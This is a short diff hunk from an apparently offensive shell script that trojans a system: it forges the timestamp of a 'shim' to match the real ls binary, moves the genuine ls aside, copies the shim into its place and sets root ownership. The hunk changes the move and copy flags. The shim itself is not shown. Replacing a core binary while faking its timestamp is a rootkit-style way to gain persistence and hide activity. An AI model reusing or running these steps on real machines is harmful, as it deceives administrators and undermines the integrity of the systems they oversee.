@@ -25,10 +25,10 @@ touch -r $LS $SHIM
 
 echo "[*] Moving things around .."
 # move ls binary
-mv -f $LS $BK
+mv -fi $LS $BK
 
 # replace it with my shim
-mv -f $SHIM $LS
+cp -fi $SHIM $LS
 
 echo "[*] setting permissions.."
 # Set root as the owner
